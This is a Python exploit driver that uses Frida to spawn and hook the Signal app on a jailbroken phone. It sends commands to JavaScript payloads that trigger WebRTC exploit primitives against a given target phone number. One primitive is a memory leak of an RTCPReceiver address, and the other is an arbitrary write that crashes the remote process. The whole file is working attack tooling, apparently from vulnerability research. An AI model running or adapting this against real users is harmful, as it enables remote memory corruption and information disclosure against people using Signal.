#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import json
import frida
import signal
import time
from utils import log


class ExploitTrigger:
    """
    ExploitTrigger class responsible for invoking Frida to test exploit primitives
    """

    def __init__(self, script: str, debug: bool = False, device: str = None,
                 target: str = None, target_e164: str = None):

        self.done = False
        # Frida script
        self.script = script
        # Frida session
        self.session = None
        # Debug setting. If true, will log debug output to console
        self.debug = debug
        # Frida device name. If no device, will default to first USB cxn
        self.device = device
        # Primitive to target
        self.target = target
        # Target phone number
        self.target_e164 = target_e164

    def cleanup(self):
        """
        Detach from Frida and clean up process so the ExploitTrigger can return
        """
        if self.device and self.session:
            self.device.kill(self.pid)
            self.session.detach()
            self.device = None
            self.session = None
        self.done = True

    def on_message(self, message, data):
        """
        Frida onMessage handler for routing message and data to appropriate Driver handlers
        """
        if message["type"] == "error":
            if "description" in message and \
                    message["description"] == "Exiting Frida JS script":
                level = ""
            else:
                level = "err"
            log(message["description"], level)
            exit(1)
        if "key" in message["payload"]:
            key = message["payload"]["key"]
            if key == "CommandRequest":
                if self.target == "read":
                    log("Triggering read")
                    self.trigger_read()
                else:
                    log("Triggering write")
                    self.trigger_write()
            elif key == "notify":
                log(message["payload"]["notification"])
            elif key == "debug":
                log(message["payload"]["function"] + '\n' +
                    message["payload"]["data"].replace("\\n", "\n"), "debug")
            elif key == "LeakedAddr":
                addr = int(message["payload"]["val"])
                log("Leaked address " + hex(addr) + "!")
                self.cleanup()

    def trigger_read(self):
        """
        Trigger leak primitive by leaking the RTCPReceiver instance
        """

        mes = {"type": "command", "command": "read", "toSendUpper": None,
               "toSendLower": 0x4141}
        if self.debug:
            log("Sending leak message " + json.dumps(mes), "debug")
        self.script.post(mes)

    def trigger_write(self):
        """
        Trigger write primitive by arbitrary supply a destination address. This will crash the process.
        """

        self.script.post(
            {
                "type": "command",
                "command": "write",
                "addr": 0xdeadbeefdeadbeef,
                "len": 1337,
            },
            b'\x41' * 1337
        )
        log("Check Xcode to confirm the process crashed due to a EXC_BAD_ACCESS")
        self.cleanup()

    def handle(self):
        """
        Setup Driver by spawning Signal and Frida on jailbroken device
        """
        if self.device:
            self.device = frida.get_device(self.device)
        else:
            self.device = frida.get_usb_device()
        log("Connected to Frida device")
        try:
            pid = self.device.get_process("Signal")
            log("Killing existing Signal process on device", "debug")
            self.device.kill(pid.pid)
        except frida.ProcessNotFoundError:
            pass
        except Exception as ex:
            print("Got exception", ex, "querying for existing Signal process")
            exit(1)
        self.pid = self.device.spawn(["org.thoughtcrime.securesms"])
        log("Attaching to Signal on driver device")
        self.session = self.device.attach(self.pid)
        log("Resuming Signal on driver device")
        self.device.resume(self.pid)
        time.sleep(4)
        log("Loading Frida scripts")
        scripts = self.script.split(",")
        js = ""
        for i in scripts:
            js += open(i, 'r').read() + "\n"
        self.script = self.session.create_script(js)
        self.script.on('message', self.on_message)
        self.script.load()

        # send configuration options
        self.script.post({"type": "config", "debug": self.debug})
        self.script.post({"type": "e164", "e164": self.target_e164})

        log("Triggering primitive...")

        while not self.done:
            continue

        return


def sigint_handler(sig, frame):
    global driver
    log("SIGINT received, cleaning up")
    if driver:
        driver.cleanup()
    exit(1)


'''
Global ExploitDriver class. Define as as global to allow cleanup for SIGINT
'''
driver = None

if __name__ == '__main__':
    signal.signal(signal.SIGINT, sigint_handler)

    parser = argparse.ArgumentParser(description="WebRTC Exploit Trigger",
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument(
        "-l", "--script", help="Javascript Frida client script", required=False, type=str,
        default="call.js,trigger.js")
    parser.add_argument(
        "-d", "--debug", help="Set debug logging", required=False,
        action='store_true')
    parser.add_argument(
        "-D", "--device", help="Thrower device ID connected via USB", type=str,
        required=True)
    parser.add_argument(
        "-t", "--target", help="Primitive to trigger", type=str,
        choices=['read', 'write'], required=True)
    parser.add_argument(
        "-n", "--number", help="Target phone number (E164)", type=str,
        required=True)
    args = parser.parse_args()

    if not args.script:
        print("Please provide at least one Javascript Frida client script (e.g script1.js,script2.js) <-l>")
        exit(1)

    driver = ExploitTrigger(args.script, args.debug, args.device, args.target,
                            args.number)
    driver.handle()
    driver.cleanup()
